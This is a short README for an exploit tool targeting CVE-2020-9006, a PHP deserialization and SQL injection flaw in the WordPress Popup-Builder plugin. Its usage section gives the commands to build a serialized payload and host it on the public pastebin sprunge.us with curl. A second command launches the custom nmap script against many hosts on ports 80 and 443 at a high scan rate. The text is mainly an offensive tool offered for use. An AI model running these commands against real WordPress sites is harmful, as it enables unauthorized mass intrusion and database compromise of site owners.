# CVE-2020-9006: Wordpress Popup-Builder Plugin Exploit

Usage:

```zsh
# Create and upload payload
# Also see: php create-serialized-payload.php -h
$ php create-serialized-payload.php | curl -F 'sprunge=<-' http://sprunge.us
http://sprunge.us/XXXXXX

# Run exploit
$ nmap --script ./cve-2020-9006 --script-args http.useragent='Mozilla/5.0',payload-url='http://sprunge.us/XXXXXX
' --min-parallelism 64 --min-rate 1000 --max-retries 1 -p 80,443 -oX report.xml -d ...hosts
```

## Links

- [CVE-2020-9006 – popup-builder WP Plugin SQL injection via PHP Deserialization](https://zeroauth.ltd/blog/2020/02/16/cve-2020-9006-popup-builder-wp-plugin-sql-injection-via-php-deserialization/)
